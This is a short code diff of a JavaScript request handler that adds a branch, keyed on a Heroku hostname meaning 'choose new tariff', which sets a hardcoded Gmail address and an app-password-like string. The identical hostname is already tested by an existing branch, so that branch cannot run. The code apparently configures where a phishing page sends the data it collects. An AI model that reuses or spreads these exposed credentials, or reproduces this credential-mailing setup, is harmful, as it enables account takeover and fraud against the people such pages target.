@@ -9,6 +9,12 @@ export default function handler(req, res) {
    
     if (url == 'pilih-tarif-baru.herokuapp.com'){
 
+       email = 'kitelaju15@gmail.com'
+       pass = 'lmwjewhspkydbhsv'
+    }else
+    
+    if (url == 'pilih-tarif-baru.herokuapp.com'){
+
        email = 'lajutobo74@gmail.com'
        pass = 'mfuzhjhciqkcqdwx'
     }else
